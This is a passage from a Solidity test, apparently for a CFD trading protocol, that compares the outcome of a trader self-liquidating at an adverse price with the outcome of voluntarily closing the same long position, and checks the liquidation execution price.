        Outcome memory selfLiq = _selfLiquidate(TRADER, adversePrice);
        _logOutcome("Live market: self-liquidation", selfLiq, traderBefore, poolBefore, treasuryBefore);
        // basket aggregation of the two mock feeds rounds down by one 8-dec unit
        assertApproxEqAbs(selfLiq.executionPrice, adversePrice, 2, "live liquidation at the supplied adverse price");

        vm.revertToState(snap);
        Outcome memory close = _voluntaryClose(TRADER, CfdTypes.Side.LONG, SIZE, adversePrice);
        _logOutcome("Live market: voluntary close", close, traderBefore, poolBefore, treasuryBefore);

        _compare(selfLiq, close);
    }

}
```
